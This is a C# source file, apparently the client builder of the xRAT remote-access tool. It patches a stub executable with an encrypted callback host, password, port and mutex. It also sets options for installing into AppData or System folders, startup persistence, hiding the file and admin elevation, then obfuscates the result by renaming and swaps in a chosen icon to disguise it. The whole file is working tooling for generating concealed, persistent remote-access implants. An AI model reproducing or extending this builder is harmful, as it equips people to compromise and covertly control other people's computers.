﻿using Core.Encryption;
using Mono.Cecil;
using Mono.Cecil.Cil;
using System.Windows.Forms;
using xRAT_2.Settings;

namespace Core.Build
{
    class ClientBuilder
    {
        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath)
        {
            // PHASE 1 - Settings
            string encKey = Helper.GetRandomName(20);
            AssemblyDefinition assembly = AssemblyDefinition.ReadAssembly("client.bin");

            foreach (var typeDef in assembly.Modules[0].Types)
            {
                if (typeDef.FullName == "Client.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1, ints = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr") // string
                                {
                                    switch (strings)
                                    {
                                        case 1: //version
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(Application.ProductVersion + " " + XMLSettings.VERSION, encKey);
                                            break;
                                        case 2: //ip/hostname
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
                                            break;
                                        case 3: //password
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(password, encKey);
                                            break;
                                        case 4: //installsub
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(installsub, encKey);
                                            break;
                                        case 5: //installname
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(installname, encKey);
                                            break;
                                        case 6: //mutex
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(mutex, encKey);
                                            break;
                                        case 7: //startupkey
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(startupkey, encKey);
                                            break;
                                        case 8: //random encryption key
                                            methodDef.Body.Instructions[i].Operand = encKey;
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" || methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
                                {
                                    switch (bools)
                                    {
                                        case 1: //install
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(install));
                                            break;
                                        case 2: //startup
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(startup));
                                            break;
                                        case 3: //hidefile
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hidefile));
                                            break;
                                        case 4: //AdminElevation
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(adminelevation));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
                                {
                                    switch (ints)
                                    {
                                        case 1: //port
                                            methodDef.Body.Instructions[i].Operand = port;
                                            break;
                                        case 2: //reconnectdelay
                                            methodDef.Body.Instructions[i].Operand = reconnectdelay;
                                            break;
                                    }
                                    ints++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // number for directory
                                {
                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(installpath);
                                }
                            }
                        }
                    }
                }
            }

            // PHASE 2 - Renaming
            Renamer r = new Renamer(assembly);
            r.Perform();
            if (!r.Success)
                throw new System.Exception("renaming failed");

            // PHASE 3 - Saving
            r.AsmDef.Write(output);

            // PHASE 4 - Icon changing
            if (!string.IsNullOrEmpty(iconpath))
                IconInjector.InjectIcon(output, iconpath);
        }

        private static OpCode BoolOpcode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        private static sbyte GetSpecialFolder(int installpath)
        {
            switch (installpath)
            {
                case 1:
                    return 26; // Appdata
                case 2:
                    return 38; // ProgramFiles
                case 3:
                    return 37; // System
                default:
                    return 26; // Appdata
            }
        }
    }
}
